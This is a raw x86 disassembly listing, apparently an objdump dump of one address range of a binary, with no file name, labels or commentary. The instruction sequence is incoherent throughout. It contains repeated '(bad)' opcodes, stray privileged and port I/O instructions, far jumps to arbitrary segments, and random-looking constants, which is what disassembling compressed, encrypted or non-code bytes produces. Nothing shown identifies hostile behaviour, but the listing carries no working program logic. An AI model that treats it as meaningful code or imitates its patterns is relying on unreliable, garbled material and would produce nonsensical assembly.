  421084:	adc    al,0xe5
  421086:	fdiv   QWORD PTR [edi+0x63]
  421089:	(bad)  
  42108b:	xchg   ebp,eax
  42108c:	stos   BYTE PTR es:[edi],al
  42108d:	push   eax
  42108e:	push   esi
  42108f:	push   esp
  421090:	pop    esi
  421091:	cmp    ch,BYTE PTR ds:0xbce36e34
  421097:	stos   DWORD PTR es:[edi],eax
  421098:	push   ebp
  421099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42109a:	sbb    edi,eax
  42109c:	jne    0x42107c
  42109e:	xchg   edx,eax
  42109f:	push   ecx
  4210a0:	fcom   QWORD PTR [eax+0x12fce7ca]
  4210a6:	test   eax,0x55bf828b
  4210ab:	imul   edx,DWORD PTR [eax-0x6a2f9f53],0xfde968a2
  4210b5:	jns    0x42104e
  4210b7:	lock inc ebx
  4210b9:	test   BYTE PTR [eax],dh
  4210bb:	push   esi
  4210bc:	adc    eax,0x5af4e3b5
  4210c1:	ret    0x6fcb
  4210c4:	push   0x6a341ea4
  4210c9:	xor    cl,al
  4210cb:	xor    dl,BYTE PTR [eax]
  4210cd:	or     al,0xa6
  4210cf:	sub    esi,DWORD PTR [ecx]
  4210d1:	sub    bh,bl
  4210d3:	fnstcw WORD PTR [ebx]
  4210d5:	mov    ebp,0xe95db1ae
  4210da:	push   eax
  4210db:	pushf  
  4210dc:	cmp    BYTE PTR [edi-0xc],bh
  4210df:	jbe    0x4210bc
  4210e1:	pop    esp
  4210e2:	ins    DWORD PTR es:[edi],dx
  4210e3:	jg     0x4210c3
  4210e5:	(bad)  
  4210e6:	xor    bh,bl
  4210e8:	fld    TBYTE PTR [edi-0x67]
  4210eb:	and    BYTE PTR [edi+0x5548be],0x5b
  4210f2:	retf   
  4210f3:	inc    esi
  4210f4:	jl     0x421086
  4210f6:	mov    al,ds:0x61dcfcb5
  4210fb:	test   eax,0x95d81dd9
  421100:	test   al,0x66
  421102:	test   DWORD PTR [ebx+edi*8-0x69],ebx
  421106:	dec    esi
  421107:	adc    cl,ah
  421109:	push   esp
  42110a:	in     al,dx
  42110b:	pop    ds
  42110c:	and    edx,ecx
  42110e:	mov    ?,ecx
  421110:	psllq  mm4,QWORD PTR [ebp+0x31]
  421114:	retf   0xd46e
  421117:	sbb    al,0xbc
  421119:	mov    ds,WORD PTR [ebp-0x55]
  42111c:	in     al,0x91
  42111e:	pop    ecx
  42111f:	in     ax,dx
  421121:	mov    ah,0x46
  421123:	retf   
  421124:	cmp    DWORD PTR [ebp-0xe0a546c],ecx
  42112a:	out    dx,al
  42112b:	(bad)  
  42112c:	sbb    BYTE PTR [esi],cl
  42112e:	push   ebx
  42112f:	jb     0x4210d4
  421131:	fcmovu st,st(6)
  421133:	add    al,0x2e
  421135:	rol    esi,0x46
  421138:	ss xchg esp,eax
  42113a:	sub    esi,ecx
  42113c:	xchg   esp,eax
  42113d:	mov    ah,0x61
  42113f:	mov    ebp,0x574d33d
  421144:	push   esi
  421145:	push   DWORD PTR [ebp-0x60db1d71]
  42114b:	mov    ds:0x133d95ab,al
  421150:	jne    0x42110e
  421152:	dec    edi
  421153:	jl     0x42117f
  421155:	arpl   WORD PTR [edx+ecx*1],dx
  421158:	push   DWORD PTR [edi]
  42115a:	jl     0x421135
  42115c:	in     al,dx
  42115d:	sbb    edi,eax
  42115f:	adc    eax,DWORD PTR [esi-0x7a]
  421162:	push   cs
  421163:	or     bh,bl
  421165:	mov    esp,DWORD PTR [eax]
  421167:	inc    eax
  421168:	sbb    al,0x1c
  42116a:	or     DWORD PTR [ecx+0x5f34ffef],edx
  421170:	mov    gs,eax
  421172:	fist   DWORD PTR [ebx]
  421174:	and    eax,0xa2e4fcc1
  421179:	pop    esi
  42117a:	lahf   
  42117b:	fld    DWORD PTR [ebx]
  42117d:	(bad)  
  42117e:	fs ret 0xd969
  421182:	ja     0x421198
  421184:	mov    dl,0xda
  421186:	cmp    al,0x94
  421188:	(bad)  
  421189:	std    
  42118a:	call   0xb26886df
  42118f:	and    cl,ah
  421191:	mov    dh,0xc0
  421193:	cmp    DWORD PTR [ebx-0x7d],eax
  421196:	aam    0x70
  421198:	je     0x4211a4
  42119a:	xor    eax,0xe61c5a15
  42119f:	add    al,0x71
  4211a1:	jmp    0xff0b:0x9873474a
  4211a8:	sub    DWORD PTR [ecx],ebp
  4211aa:	mov    edx,0x812125bb
  4211af:	(bad)  
  4211b0:	addr16 mov fs:0x42ca,al
  4211b5:	ja     0x42116d
  4211b7:	std    
  4211b8:	inc    edi
  4211b9:	lea    esi,[edi]
  4211bb:	push   0x6608af1f
  4211c0:	out    dx,al
  4211c1:	and    bh,BYTE PTR ds:0xe4772c1f
  4211c7:	xchg   ebx,eax
  4211c8:	cld    
  4211c9:	icebp  
  4211ca:	mov    ds:0xdc9496fa,al
  4211cf:	sub    dh,bl
  4211d1:	inc    ebx
  4211d2:	xor    eax,0x44c0dcb0
  4211d7:	int3   
  4211d8:	lea    edi,[eax]
  4211da:	ja     0x4211cc
  4211dc:	jecxz  0x42123a
  4211de:	test   eax,0x441207a2
  4211e3:	inc    edi
  4211e4:	div    BYTE PTR [eax]
  4211e6:	jge    0x421240
  4211e8:	out    dx,al
  4211e9:	loop   0x42120b
  4211eb:	jb     0x4211fe
  4211ed:	pop    ecx
  4211ee:	jbe    0x4211de
  4211f0:	adc    ebx,DWORD PTR [ecx+0x2fd9d6c9]
  4211f6:	push   ss
  4211f7:	loop   0x421268
  4211f9:	ins    BYTE PTR es:[edi],dx
  4211fa:	cld    
  4211fb:	push   0x69ce918a
  421200:	daa    
  421201:	imul   edx,DWORD PTR [edi-0x37],0xe2017c0f
  421208:	ret    
  421209:	sbb    DWORD PTR [edi-0x5b],edx
  42120c:	(bad)  
  42120d:	xlat   BYTE PTR ds:[ebx]
  42120e:	jbe    0x421242
  421210:	dec    ecx
  421211:	stos   DWORD PTR es:[edi],eax
  421212:	adc    edx,DWORD PTR [ebx+0x4fdc540f]
  421218:	sbb    al,0x40
  42121a:	cld    
  42121b:	and    al,0x9c
  42121d:	adc    eax,0x598acf3f
  421222:	sbb    al,0x8e
  421224:	sahf   
  421225:	test   al,0x7d
  421227:	cmp    DWORD PTR [edx+edx*8-0x35],0x3a94a514
  42122f:	jl     0x42127f
  421231:	push   ebx
  421232:	ss pop ecx
  421234:	mov    ch,0xc
  421236:	adc    al,0x3e
  421238:	je     0x42127f
  42123a:	mov    edi,0x57b9236a
  42123f:	fldcw  WORD PTR [ecx-0x7cda5bc3]
  421245:	cld    
  421246:	mov    eax,ds:0x60b0b3d7
  42124b:	popf   
  42124c:	(bad)  
  42124d:	jmp    0xcadc:0xa0c1764a
  421254:	jns    0x4211e7
  421256:	ss jg  0x421239
  421259:	int    0xe1
  42125b:	jle    0x421290
  42125d:	add    DWORD PTR [edi+ebp*1-0x1b],esi
  421261:	lock xor BYTE PTR [edx-0xd2e7f0a],al
  421268:	fisub  WORD PTR ds:0x3953c2a3
  42126e:	dec    ecx
  42126f:	stos   DWORD PTR es:[edi],eax
  421270:	cmp    DWORD PTR [eax],ebx
  421272:	ja     0x421263
  421274:	pop    esi
  421275:	cli    
  421276:	popa   
  421277:	fldcw  WORD PTR [ebx]
  421279:	or     DWORD PTR [esi-0x18],esp
  42127c:	shr    BYTE PTR [eax+0x51fcc254],cl
  421282:	jo     0x4212e3
  421284:	inc    ebp
  421285:	test   al,0x7b
  421287:	push   ebp
  421288:	mov    esi,0xd5731e51
  42128d:	outs   dx,BYTE PTR ds:[esi]
  42128e:	jmp    0xa76ab760
  421293:	mov    ah,0x19
  421295:	out    0x8e,eax
  421297:	lods   eax,DWORD PTR ds:[esi]
  421298:	in     al,dx
  421299:	mov    cs,WORD PTR [ecx]
  42129b:	add    DWORD PTR [esi+edx*4+0x4a],0x48194051
  4212a3:	fs inc ebp
  4212a5:	sbb    eax,0xba841949
  4212aa:	push   ebp
  4212ab:	dec    esi
  4212ac:	add    ebx,DWORD PTR [edx+0x2]
  4212af:	push   ecx
  4212b0:	dec    edi
  4212b1:	sub    cl,cl
  4212b3:	ja     0x4212f6
  4212b5:	xchg   esp,eax
  4212b6:	mov    edx,0xe3723ecd
  4212bb:	push   es
  4212bc:	sbb    eax,0xff167e38
  4212c1:	arpl   WORD PTR [ebp-0x19ffd036],ax
  4212c7:	sbb    ch,BYTE PTR [esi]
  4212c9:	sub    DWORD PTR [edi],eax
  4212cb:	aas    
  4212cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212ce:	ja     0x421272
  4212d0:	pushf  
  4212d1:	cmp    BYTE PTR [edx+edi*8-0x6],dh
  4212d5:	ins    DWORD PTR es:[edi],dx
  4212d6:	jo     0x421279
  4212d8:	sub    DWORD PTR ds:0xbc156f3d,esp
  4212de:	out    dx,al
  4212df:	add    dl,BYTE PTR [esi+0x3c]
  4212e2:	lock scas eax,DWORD PTR es:[edi]
  4212e4:	pop    ss
  4212e5:	int3   
  4212e6:	(bad)  
  4212e8:	sub    eax,0x9a29fea2
  4212ed:	push   esp
  4212ee:	(bad)  
  4212ef:	mov    WORD PTR [esi-0x285a2590],es
  4212f5:	mov    ch,0x6
  4212f7:	or     eax,0x7206866d
  4212fc:	mov    edi,0x7c0e7be4
  421301:	call   0x41ff09c0
  421306:	(bad)  
  421307:	in     al,0xa2
  421309:	sbb    al,0x97
  42130b:	mov    ?,edx
  42130d:	mov    bh,0xf1
  42130f:	sbb    eax,0x6826f58d
  421314:	mov    al,0x47
  421316:	xor    BYTE PTR [ebp-0x49],bl
  421319:	arpl   WORD PTR [esi],bx
  42131b:	push   esp
  42131c:	scas   eax,DWORD PTR es:[edi]
  42131d:	mov    cl,cl
  42131f:	xlat   BYTE PTR ds:[ebx]
  421320:	add    al,0x3f
  421322:	sar    BYTE PTR [ebp-0x5ffdb42e],1
  421328:	ror    BYTE PTR [ecx+0x3c],1
  42132b:	dec    esi
  42132c:	loop   0x42136e
  42132e:	mov    eax,ds:0x9e1e0b0d
  421333:	cmp    bh,cl
  421335:	(bad)  
  421336:	stos   BYTE PTR es:[edi],al
  421337:	out    0x52,al
  421339:	push   esi
  42133a:	test   eax,0x67d0099f
  42133f:	je     0x42139a
  421341:	mov    BYTE PTR [edi-0x31],dl
  421344:	not    BYTE PTR [eax]
  421346:	sbb    al,0x55
  421348:	int    0x22
  42134a:	lea    ecx,[ebx+0x1e]
  42134d:	mov    edx,0x72c38b98
  421352:	sub    esi,DWORD PTR [ecx+eiz*4-0x27]
  421356:	je     0x4212f3
  421358:	stos   DWORD PTR es:[edi],eax
  421359:	adc    eax,0x663f4a1a
  42135e:	ja     0x4212e3
  421360:	cmp    BYTE PTR [ebp-0x1d],0xf
  421364:	inc    edi
  421365:	scas   al,BYTE PTR es:[edi]
  421366:	(bad)  
  421367:	mov    bl,0xc1
  421369:	push   eax
  42136a:	dec    ecx
  42136b:	xchg   esp,eax
  42136c:	in     al,dx
  42136d:	lea    esi,[eax-0x4c]
  421370:	aad    0x34
  421372:	and    ebp,edi
  421374:	je     0x4213f0
  421376:	ret    0xc35b
  421379:	jp     0x421339
  42137b:	xor    DWORD PTR [edi-0x589616c9],ebp
  421381:	test   DWORD PTR [esi],esp
  421383:	sti    
  421384:	test   DWORD PTR [ecx+0x60],edx
  421387:	or     dh,BYTE PTR [ebx+esi*4]
  42138a:	enter  0xd459,0x9f
  42138e:	clc    
  42138f:	in     al,dx
  421390:	cwde   
  421391:	imul   esp,DWORD PTR [edi],0x1d
  421394:	loopne 0x421412
  421396:	es mov cl,0x6b
  421399:	jmp    0x5ba0:0xf58a35c
  4213a0:	call   0xb9df:0x80b05aa
  4213a7:	pop    ecx
  4213a8:	pusha  
  4213a9:	xchg   DWORD PTR [ebx],ebx
  4213ab:	popf   
  4213ac:	daa    
  4213ad:	jecxz  0x42140b
  4213af:	fs out dx,al
  4213b1:	mov    ebp,0x96fff77c
  4213b6:	and    eax,0x8f088171
  4213bb:	scas   al,BYTE PTR es:[edi]
  4213bc:	pop    eax
  4213bd:	inc    ecx
  4213be:	setge  BYTE PTR [ebx-0x29]
  4213c2:	xchg   ebp,eax
  4213c3:	sub    eax,0xf32a03d0
  4213c8:	retf   0x8089
  4213cb:	clc    
  4213cc:	fild   QWORD PTR [esi+0x39]
  4213cf:	(bad)  [ebx+0x3c]
  4213d2:	add    al,0x2d
  4213d4:	add    eax,edx
  4213d6:	(bad)  [ecx+0x0]
  4213d9:	or     DWORD PTR [eax+0x74],ebx
  4213dc:	and    eax,0xa9589ded
  4213e1:	mov    dl,0xfe
  4213e3:	xor    dh,ah
  4213e5:	scas   al,BYTE PTR es:[edi]
  4213e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213e7:	out    dx,eax
  4213e8:	shl    DWORD PTR [edx+0x7c0c3a42],1
  4213ee:	and    cl,al
  4213f0:	aaa    
  4213f1:	(bad)  ss:[ebp-0x64]
  4213f5:	mov    edi,0x6b4afae6
  4213fa:	jo     0x4213cf
  4213fc:	sbb    ecx,DWORD PTR ds:0xf8a82e4f
  421402:	popa   
  421403:	ja     0x421455
  421405:	or     al,0xd
  421407:	mov    ds:0x56e65bd8,eax
  42140c:	cld    
  42140d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42140e:	aad    0x5f
  421410:	inc    ebx
  421411:	addr16 adc al,0xea
  421414:	bound  esi,QWORD PTR [ecx]
  421416:	pop    ebx
  421417:	xor    BYTE PTR [esi],bl
  421419:	out    dx,eax
  42141a:	mov    ds:0xa6c390d0,eax
  42141f:	push   esi
  421420:	dec    edx
  421421:	(bad)  [edi-0x20ccdfca]
  421427:	popa   
  421428:	cs test al,0xfc
  42142b:	add    ah,BYTE PTR [ebx+0x6c]
  42142e:	loop   0x4213e6
  421430:	dec    ecx
  421431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421432:	cmp    al,0xe6
  421434:	sbb    dl,BYTE PTR [edi+0x5b0ceaca]
  42143a:	aaa    
  42143b:	jp     0x42145e
  42143d:	pop    ds
  42143e:	mov    eax,ds:0xa8401924
  421443:	add    ebp,DWORD PTR [esi+0x7c]
  421446:	adc    eax,0x3da5e8f2
  42144b:	int    0xeb
  42144d:	aas    
  42144e:	sbb    ah,ch
  421450:	add    al,0x66
  421452:	stos   BYTE PTR es:[edi],al
  421453:	(bad)  
  421454:	js     0x421495
  421456:	xlat   BYTE PTR ds:[ebx]
  421457:	push   ebp
  421458:	std    
  421459:	push   esp
  42145a:	call   0xa010:0xe9968bf1
  421461:	push   cs
  421462:	xor    BYTE PTR [esi+0x2da034da],dl
  421468:	jg     0x421405
  42146a:	mov    eax,0x798e065f
  42146f:	js     0x42147a
  421471:	lods   al,BYTE PTR ds:[esi]
  421472:	push   ebx
  421473:	test   DWORD PTR [edx],esp
  421475:	sbb    DWORD PTR [eax+0x696a80c],eax
  42147b:	fsub   DWORD PTR [ebx-0x47]
  42147e:	inc    ebx
  42147f:	lods   al,BYTE PTR ds:[esi]
  421480:	(bad)
  421484:	sub    dl,cl
  421486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421487:	xchg   ecx,eax
  421488:	popa   
  421489:	psubsw mm3,QWORD PTR [ebp+0x2bb03df9]
  421490:	shr    al,cl
  421492:	and    ah,BYTE PTR [ebp+0x4486d052]
  421498:	aad    0xd1
  42149a:	aam    0x9e
  42149c:	cmp    ch,BYTE PTR [esi+0x48]
  42149f:	xor    ah,BYTE PTR [edi-0x41f42958]
  4214a5:	aas    
  4214a6:	and    ecx,DWORD PTR [edx]
  4214a8:	cmp    eax,0x152e972a
  4214ad:	in     al,dx
  4214ae:	ret    0x544f
  4214b1:	call   0xd30eec12
  4214b6:	pop    es
  4214b7:	sbb    esp,DWORD PTR [eax+ecx*4]
  4214ba:	fistp  QWORD PTR [ecx-0x74]
  4214bd:	pusha  
  4214be:	mov    BYTE PTR [ebx+0x6f219451],bh
  4214c4:	jne    0x42151b
  4214c6:	jno    0x42152f
  4214c8:	std    
  4214c9:	adc    dl,BYTE PTR [edi+0x46]
  4214cc:	jmp    0x4214fa
  4214ce:	or     bh,dh
  4214d0:	mov    eax,0x7fd0bc93
  4214d5:	enter  0xc7a,0xd6
  4214d9:	imul   esp,edx,0xeb736e8c
  4214df:	(bad)  
  4214e0:	adc    DWORD PTR [ebx],ebx
  4214e2:	xor    bh,BYTE PTR [edx+0x3e178c73]
  4214e8:	pop    ebp
  4214e9:	retf   0x85c1
  4214ec:	mov    esi,0xe36fd5b9
  4214f1:	sub    edx,DWORD PTR [eax+ebx*8-0x52]
  4214f5:	mov    dl,0x6a
  4214f7:	pop    ebp
  4214f8:	div    BYTE PTR [edx+0x49556e4d]
  4214fe:	ins    DWORD PTR es:[edi],dx
  4214ff:	add    DWORD PTR [eax+ebx*4-0x33640cf7],esi
  421506:	mov    edx,0xbda78231
  42150b:	jne    0x4214b4
  42150d:	mov    bl,0x28
  42150f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421510:	sub    edi,DWORD PTR [esi-0x13e71b92]
  421516:	rol    BYTE PTR [ebp+0x17],0xe
  42151a:	daa    
  42151b:	xor    BYTE PTR [ecx-0x5ead75b5],0x15
  421522:	add    al,0x98
  421524:	dec    edi
  421525:	xchg   ebx,eax
  421526:	sub    al,0xc4
  421528:	or     ecx,DWORD PTR [ecx+0x26]
  42152b:	sbb    esi,ebx
  42152d:	fs hlt 
  42152f:	cmp    BYTE PTR [esp+eax*2+0x2674bb47],dh
  421536:	outs   dx,BYTE PTR ds:[esi]
  421537:	mov    edx,0xeee069d7
  42153c:	xchg   ecx,eax
  42153d:	ficom  WORD PTR [esi]
  42153f:	mov    eax,0xad45f886
  421544:	daa    
  421545:	or     cl,BYTE PTR [ebx+0x6f628ee2]
  42154b:	minps  xmm1,XMMWORD PTR [edx+edi*4-0x5c]
  421550:	out    0xf5,al
  421552:	push   0x9d69572f
  421557:	outs   dx,DWORD PTR ds:[esi]
  421558:	cmp    edi,esi
  42155a:	sahf   
  42155b:	pop    ebx
  42155c:	stos   DWORD PTR es:[edi],eax
  42155d:	aas    
  42155e:	adc    al,0x72
  421560:	dec    ebx
  421561:	xor    edi,DWORD PTR [edi+0x0]
  421564:	add    BYTE PTR [eax],al
  421566:	add    BYTE PTR [eax],al
  421568:	add    BYTE PTR [eax],al
  42156a:	push   edi
  42156b:	pop    edx
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0x146ebdb5
  421579:	cmp    DWORD PTR [esi-0x5c],edx
  42157c:	add    DWORD PTR [eax],eax
  42157e:	add    DWORD PTR [esi],0x9a990000
  421584:	pop    ss
  421585:	xchg   DWORD PTR [edi+0x27],esp
  421588:	es xchg edi,eax
  42158a:	mov    ecx,DWORD PTR [ebx+edx*2-0x71]
  42158e:	lods   al,BYTE PTR ds:[esi]
  42158f:	sbb    eax,0x7870c1f7
  421594:	js     0x421548
  421596:	ror    DWORD PTR [edi+ebp*1-0xb00539f],1
  42159d:	mov    esp,0x3ab24109
  4215a2:	mov    ss,WORD PTR [eax+0x71]
  4215a5:	shr    DWORD PTR [ecx],1
  4215a7:	pop    es
  4215a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215a9:	ins    BYTE PTR es:[edi],dx
  4215aa:	in     eax,dx
  4215ab:	outs   dx,DWORD PTR ds:[esi]
  4215ac:	xchg   BYTE PTR [ecx+0xf],al
  4215af:	repz mov cl,0xb7
  4215b2:	test   BYTE PTR [ecx-0x17],0xa
  4215b6:	lods   eax,DWORD PTR ds:[esi]
  4215b7:	mov    ah,0x41
  4215b9:	arpl   WORD PTR [ebx+0x18],dx
  4215bc:	inc    edx
  4215bd:	sbb    al,0x59
  4215bf:	xor    esi,ecx
  4215c1:	in     eax,dx
  4215c2:	scas   al,BYTE PTR es:[edi]
  4215c3:	dec    ecx
  4215c4:	xchg   esi,eax
  4215c5:	dec    ebx
  4215c6:	mov    dl,0xe9
  4215c8:	les    edi,FWORD PTR [ebp+ebx*8-0x1628493f]
  4215cf:	mov    DWORD PTR [eax+0x410394],esp
  4215d5:	jo     0x42155f
  4215d7:	add    al,0x5c
  4215d9:	jmp    0x4215a1
  4215db:	xchg   esi,eax
  4215dc:	sahf   
  4215dd:	xor    bl,al
  4215df:	or     al,0x97
  4215e1:	jecxz  0x4215ad
  4215e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215e4:	sar    esp,1
  4215e6:	or     cl,BYTE PTR [ebp+0x1f]
  4215e9:	rcr    BYTE PTR [ebx-0x1e79aa3c],1
  4215ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215f0:	ret    
  4215f1:	out    0xe2,eax
  4215f3:	je     0x42161d
  4215f5:	stos   DWORD PTR es:[edi],eax
  4215f6:	mov    DWORD PTR [eax-0x18],esi
  4215f9:	jecxz  0x42164d
  4215fb:	pop    edi
  4215fc:	mov    al,ds:0xc9d371d5
  421601:	dec    ebx
  421602:	xor    BYTE PTR [eax],ah
  421604:	sbb    DWORD PTR [edx],edi
  421606:	jb     0x4215ae
  421608:	popa   
  421609:	aaa    
  42160a:	cmp    BYTE PTR [ecx+0x7],ah
  42160d:	mov    ebx,0xaa12d685
  421612:	ret    
  421613:	sbb    BYTE PTR [edi+0x2e],bl
  421616:	and    DWORD PTR [edi],esp
  421618:	jmp    0x421630
  42161a:	sahf   
  42161b:	mov    eax,ds:0x1fe51a1a
  421620:	jmp    0x28461417
  421625:	mov    ebx,0x8c472130
  42162a:	inc    ebx
  42162b:	mov    esi,0x5ebda0f9
  421630:	adc    al,0xe5
  421632:	dec    esp
  421633:	jbe    0x421698
  421635:	mov    edi,0xbe24b5f
  42163a:	icebp  
  42163b:	cmp    eax,0x3b78f29f
  421640:	xchg   ebx,eax
  421641:	das    
  421642:	loope  0x421689
  421644:	dec    eax
  421645:	xchg   esi,eax
  421646:	jae    0x4216c5
  421648:	repnz scas eax,DWORD PTR es:[edi]
  42164a:	inc    ebx
  42164b:	adc    al,0x97
  42164d:	push   0x7a7029c2
  421652:	mov    cl,0xc7
  421654:	out    0x96,eax
  421656:	mov    ah,0xc2
  421658:	out    0x30,al
  42165a:	in     eax,dx
  42165b:	in     eax,dx
  42165c:	mov    edi,0xddf64a44
  421661:	jo     0x42168e
  421663:	sub    eax,0x84c640ab
  421668:	lods   al,BYTE PTR ds:[esi]
  421669:	stos   BYTE PTR es:[edi],al
  42166a:	fisub  DWORD PTR [eax]
  42166c:	aam    0x70
  42166e:	rcl    BYTE PTR [ebx+0x24],cl
  421671:	les    esi,FWORD PTR [esi+0x63324f84]
  421677:	jmp    0x8fe4:0xf6c0a15c
  42167e:	aas    
  42167f:	repz mov ebp,0x8c53723d
  421685:	dec    esi
  421686:	(bad)  
  421687:	cs enter 0x624c,0x3f
  42168c:	jecxz  0x42162c
  42168e:	sub    eax,0x819bc423
  421693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421694:	lods   eax,DWORD PTR ds:[esi]
  421695:	(bad)  [edi]
  421697:	aaa    
  421698:	mov    ebp,0x4a919a60
  42169d:	xchg   edi,eax
  42169e:	xor    BYTE PTR [ebp+0x7c],0xa7
  4216a2:	sub    BYTE PTR [edi+0x6562501d],al
  4216a8:	push   0x3f
  4216aa:	pop    eax
  4216ab:	cmp    DWORD PTR [edx-0x55],eax
  4216ae:	or     al,0xdd
  4216b0:	mov    cl,0x6e
  4216b2:	shl    ch,1
  4216b4:	xchg   ebx,eax
  4216b5:	add    esp,ecx
  4216b7:	and    cl,BYTE PTR [ebx]
  4216b9:	mov    eax,ds:0x225bc09d
  4216be:	daa    
  4216bf:	fisttp WORD PTR [eax-0x1b]
  4216c2:	(bad)  
  4216c3:	sub    ch,BYTE PTR [eax+0x1ba0454d]
  4216c9:	pop    edx
  4216ca:	bound  esp,QWORD PTR [ecx-0x4d]
  4216cd:	adc    bl,BYTE PTR [ebx-0x7bec16a4]
  4216d3:	idiv   DWORD PTR [eax+0x42]
  4216d6:	(bad)
  4216d9:	faddp  st(2),st
  4216db:	push   edi
  4216dc:	neg    BYTE PTR [edx-0x99cc12d]
  4216e2:	mov    eax,ds:0x314da7e5
  4216e7:	mov    eax,ds:0x9de596c4
  4216ec:	add    al,0x29
  4216ee:	jmp    0x42172a
  4216f0:	jne    0x421719
  4216f2:	or     bh,BYTE PTR ds:0x33f19c07
  4216f8:	add    BYTE PTR [ebx-0x495070a6],bl
  4216fe:	and    ah,BYTE PTR [eax]
  421700:	pop    ebx
  421701:	jl     0x421762
  421703:	cli    
  421704:	mov    esi,0x3274732c
  421709:	test   eax,0xb1f41414
  42170e:	inc    ebp
  42170f:	mov    cl,cl
  421711:	gs xchg ebp,eax
  421713:	and    eax,DWORD PTR [ebx-0x679ba3a4]
  421719:	mov    eax,0xea934e45
  42171e:	sub    eax,0x7d3fab5b
  421723:	xchg   ebx,eax
  421724:	scas   eax,DWORD PTR es:[edi]
  421725:	and    al,0x6b
  421727:	xor    al,0xdd
  421729:	mov    al,ds:0xe41e2648
  42172e:	mov    ecx,0x5464f498
  421733:	test   BYTE PTR gs:[ebp-0x49459747],0xec
  42173b:	xchg   ecx,eax
  42173c:	ins    BYTE PTR es:[edi],dx
  42173d:	and    BYTE PTR [esi+0x2bedc734],al
  421743:	inc    esi
  421744:	and    ecx,ebp
  421746:	(bad)
  421749:	adc    ah,cl
  42174b:	loopne 0x4216e6
  42174d:	mov    ebp,0x4c28b428
  421752:	int    0x95
  421754:	ins    BYTE PTR es:[edi],dx
  421755:	out    0x92,al
  421757:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  421759:	mov    esp,eax
  42175b:	pop    es
  42175c:	int    0x1e
  42175e:	cmp    cl,BYTE PTR ds:0x2f23a0c2
  421764:	push   eax
  421765:	mov    BYTE PTR [edx+0x53],bl
  421768:	sahf   
  421769:	mov    ebx,ebx
  42176b:	rol    BYTE PTR [eax+0x31221676],cl
  421771:	(bad)
  421774:	cmp    eax,0xa9b801c5
  421779:	xchg   BYTE PTR [eax],cl
  42177b:	or     ebp,esi
  42177d:	cdq    
  42177e:	mov    esp,0x73d7ce60
  421783:	push   ecx
  421784:	(bad)  
  421785:	stc    
  421786:	fmul   DWORD PTR [esi+0x3fa861ec]
  42178c:	ret    
  42178d:	cs out dx,eax
  42178f:	imul   ebp,DWORD PTR [esi],0x7e4d251b
  421795:	in     eax,0x58
  421797:	pop    ebp
  421798:	addr16 loop 0x4217b7
  42179b:	xchg   DWORD PTR [edx-0x6b],ecx
  42179e:	sub    DWORD PTR [edx+ebp*8],ebp
  4217a1:	xchg   edi,eax
  4217a2:	mov    edi,0x994ab9c
  4217a7:	ret    
  4217a8:	ins    DWORD PTR es:[edi],dx
  4217a9:	gs test eax,0xf37abbd1
  4217af:	(bad)  
  4217b0:	jmp    FWORD PTR [esi+edx*2+0x4fabeb5a]
  4217b7:	adc    DWORD PTR [esi],eax
  4217b9:	ror    DWORD PTR [esi],cl
  4217bb:	mov    al,0x64
  4217bd:	mov    eax,ds:0x970ca500
  4217c2:	pop    edx
  4217c3:	push   ebx
  4217c4:	test   al,0xec
  4217c6:	mov    eax,0xc9cbc860
  4217cb:	aaa    
  4217cc:	mov    bh,0xf3
  4217ce:	mov    ah,0x55
  4217d0:	ja     0x421843
  4217d2:	sbb    DWORD PTR [ecx-0x46460184],0x4c4ba1cf
  4217dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217dd:	test   eax,0xed645b9
  4217e2:	xchg   ebx,eax
  4217e3:	scas   al,BYTE PTR es:[edi]
  4217e4:	pusha  
  4217e5:	frstor [edi-0x1956bde4]
  4217eb:	pop    ecx
  4217ec:	sub    edi,DWORD PTR [edx-0x4e]
  4217ef:	xor    DWORD PTR [esi+0x4e],0xa
  4217f3:	and    al,0x22
  4217f5:	and    ch,BYTE PTR [edx]
  4217f7:	xchg   edx,eax
  4217f8:	outs   dx,BYTE PTR ds:[esi]
  4217f9:	push   es
  4217fa:	adc    DWORD PTR [ebx+0x81ac7ae],edi
  421800:	adc    esp,esp
  421802:	xor    ch,BYTE PTR [ebx+esi*2+0x72caa2c9]
  421809:	pop    ds
  42180a:	adc    BYTE PTR [esi+0x48],0x74
  42180e:	dec    ecx
  42180f:	jmp    FWORD PTR [ebp-0x289e2c79]
  421815:	push   ecx
  421816:	push   0xffffff90
  421818:	or     al,0x97
  42181a:	stc    
  42181b:	jl     0x4217c3
  42181d:	xchg   ebx,eax
  42181e:	call   0xc624abe9
  421823:	add    DWORD PTR [edi+ebp*1-0x52],esi
  421827:	(bad)  
  421828:	xor    eax,0xdd8b03b3
  42182d:	xlat   BYTE PTR ds:[ebx]
  42182e:	pusha  
  42182f:	mov    esi,esi
  421831:	rol    DWORD PTR [ebx],0x2a
  421834:	or     eax,0xce2e4dda
  421839:	fwait
  42183a:	cmp    DWORD PTR [eax+0x1d],edx
  42183d:	imul   edi,DWORD PTR [eax+0x31],0xffffffdf
  421841:	mov    ch,0xfc
  421843:	retf   0xf938
  421846:	call   0x903d62e4
  42184b:	outs   dx,DWORD PTR ds:[esi]
  42184c:	leave  
  42184d:	lahf   
  42184e:	mov    esi,0x3834be76
  421853:	add    eax,0xb022d8de
  421858:	adc    BYTE PTR [eax+0x59],bh
  42185b:	push   esp
  42185c:	push   ss
  42185d:	jl     0x421869
  42185f:	pop    esp
  421860:	push   es
  421861:	cmp    eax,0x90af3bd5
  421867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
